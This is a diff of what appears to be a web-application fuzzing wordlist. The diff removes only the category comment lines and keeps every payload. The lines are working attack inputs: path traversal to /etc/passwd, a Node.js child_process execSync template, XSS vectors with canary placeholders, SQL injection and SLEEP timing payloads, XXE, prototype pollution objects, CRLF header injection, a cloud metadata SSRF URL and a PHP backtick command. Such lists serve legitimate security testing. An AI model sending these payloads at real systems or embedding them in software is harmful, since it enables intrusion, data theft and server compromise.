@@ -1,4 +1,3 @@
-#--- Baseline primitives ---
 '
 "
 `
@@ -15,21 +14,17 @@
 \u0027
 &bsol;
 undefined
-	#---LFI / Traversal / Files---
 ../../../
 ..\..\..\
 ../../../../etc/passwd
 ..%2f..%2f..%2fetc%2fpasswd
-	#--- Java / Spring EL / Java SSTI---
 ${class.getResource("").getPath()}
 __init__.__globals__["{module}"].config
-	#--- Server-Side Rendering / Node.js / CSTI---
 ${global.process.mainModule.require('child_process').execSync('id')}
 }});console.log("{canary}");// 
 constructor.constructor('alert("{canary}")')()
 this.constructor.constructor("return global")().process
 Object.constructor("return process")()
-	#---XSS / DOM / HTML---
 <script>{canary}</script>
 "><img src=x onerror=alert('{canary}')>
 " tabindex=1 onfocus=alert('{canary}') x="
@@ -37,7 +32,6 @@ Object.constructor("return process")()
 '"><svg/onload=alert('{canary}')>
 "><iframe src=javascript:alert('{canary}')>
 <iframe/srcdoc="<script>alert('{canary}')</script>">
-	#---SSTI / Expr Eval---
 {{8*8}}
 [[5*5]]
 ${7*4}
@@ -45,21 +39,15 @@ ${7*4}
 ${{<%[%'"{{%\
 {{ request['user'].__class__ }}
 ${{config.env}}
-	#--- SQL Injection---
 ' OR 1=1-- -
 SLEEP(10) /*' or SLEEP(10) or '" or SLEEP(10) or "*/
-	#---XXE / XML---
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE xxe [<!ENTITY foo "{canary}">]><root>&foo;</root>
-	#---Prototype Pollution / JSON injection---
 [].__proto__.polluted = true
 {"__proto__":{"admin":true}}
 {"constructor":{"prototype":{"isAdmin":true}}}
 ","X-Injected-Header":"{canary}
-	#---Header---
 %0a%0dX-Injected-Header: {canary}
 %0aX-Real-IP: 127.0.0.1
-	#---SSRF---
 http://169.254.169.254/latest/meta-data/
-	#---Misc---
 <?php echo `id`; ?>
